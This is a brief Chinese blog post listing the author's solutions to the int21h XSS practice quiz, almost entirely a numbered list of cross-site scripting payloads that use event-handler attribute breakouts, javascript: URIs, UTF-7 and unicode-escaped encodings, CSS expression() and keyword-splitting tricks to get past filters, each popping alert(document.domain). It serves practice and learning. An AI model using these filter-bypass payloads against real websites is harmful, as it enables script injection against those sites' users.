---
layout: post
title: Xss-quiz.int21h.jp
---

知乎上有人邀请回答 int21h 的跨站题，晚上抽空重新做了一遍：

    1, 2: test"/onmouseover=alert(document.domain)//
    3: edit counttry: <script>alert(document.domain)</script>
    4: hidden input: <input type="hidden" name="p3" value="hackme”> / test"><svg onload=alert(document.domain)>
    5: Modified label length (maxlength): a"/onclick=alert(document.domain);//
    6: mog"onclick=alert(document.domain)//
    7: mog onmouseover=alert(document.domain);
    8: javascript:alert(document.domain);
    9: +ACIAIABvAG4AYwBsAGkAYwBrAD0AYQBsAGUAcgB0ACgAZABvAGMAdQBtAGUAbgB0AC4AZABvAG0AYQBpAG4AKQAvAC8-
    10: test"/onclick=alert(document.dodomainmain)//
    11: mog"><a/href=javascr&#09;ipt:alert(document.domain)>test</a>
    12: `` onmousemove=alert(document.domain)//ie
    13:background:url(javascript:alert(document.domain))
    14:mog:ex\0pression(onmouseover=function(){alert(document.domain)})
    15:\\x3csvg onload=alert(document.domain);\\x3e
    16:\\u003csvG/onload=alert(document.domain);\\u003e
    17,18: ...